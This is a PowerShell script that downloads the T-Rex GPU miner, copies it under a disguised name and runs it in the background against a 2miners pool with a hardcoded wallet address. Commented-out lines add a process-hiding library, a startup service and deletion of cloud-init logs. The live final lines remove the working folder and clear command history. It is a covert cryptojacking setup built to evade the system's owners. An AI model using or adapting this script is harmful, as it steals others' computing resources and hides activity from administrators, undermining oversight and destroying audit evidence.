# Create directory /Templates/ml
New-Item -ItemType Directory -Path /Templates/ml -Force

# Copy files Makefile and processhider.c to /Templates/ml/
# Copy-Item -Path Makefile, processhider.c -Destination /Templates/ml/

# Download t-rex miner
Invoke-WebRequest -Uri "https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz" -OutFile "/Templates/ml/t-rex-0.26.8-linux.tar.gz"

# Extract t-rex miner
Expand-Archive -Path "/Templates/ml/t-rex-0.26.8-linux.tar.gz" -DestinationPath "/Templates/ml"

# Copy t-rex miner to specified locations
Copy-Item -Path "/Templates/ml/t-rex" -Destination "/Templates/esp"
Set-ItemProperty -Path "/Templates/esp" -Name "ReadOnly" -Value $false
# Copy-Item -Path "/Templates/ml/t-rex" -Destination "/usr/local/bin/jupyternotebookagent"
# Copy-Item -Path "bookagent" -Destination "/usr/local/bin/bookagent"
# Copy-Item -Path "gnu.sh" -Destination "/usr/local/bin/gnu"

# Set execute permissions for the copied files
# Set-ItemProperty -Path "/usr/local/bin/jupyternotebookagent" -Name "ReadOnly" -Value $false
# Set-ItemProperty -Path "/usr/local/bin/bookagent" -Name "ReadOnly" -Value $false
# Set-ItemProperty -Path "/usr/local/bin/gnu" -Name "ReadOnly" -Value $false

# Run jupyternotebookagent in the background
Start-Process -FilePath "/Templates/esp" -ArgumentList "-a kawpow -o stratum+tcp://xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_5 -p x" -NoNewWindow

# Compile code
# Invoke-Expression "make"

# Move libprocesshider.so to /usr/local/lib/
# Move-Item -Path "libprocesshider.so" -Destination "/usr/local/lib/"

# Remove ld.so.preload file
# Remove-Item -Path "/etc/ld.so.preload" -Force

# Create symbolic link for gnu script
# New-Item -ItemType SymbolicLink -Path "/etc/init.d/gnu" -Target "/usr/local/bin/gnu"

# Set gnu script to run at startup
# Set-Service -Name "gnu" -StartupType "Automatic"

# Clean up temporary directories
# Remove-Item -Path "/Templates/ml" -Recurse -Force
# Remove-Item -Path "/Templates/jupyternotebookagent" -Recurse -Force

# Configure Nvidia settings
# & nvidia-smi -pm 1
# & nvidia-smi -ac 5001,1590

# Clean up logs and history
Remove-Item -Path "../xnalinux" -Recurse -Force
#Remove-Item -Path "/var/log/cloud-init.log" -Force
#Remove-Item -Path "/var/log/cloud-init-output.log" -Force
Clear-History
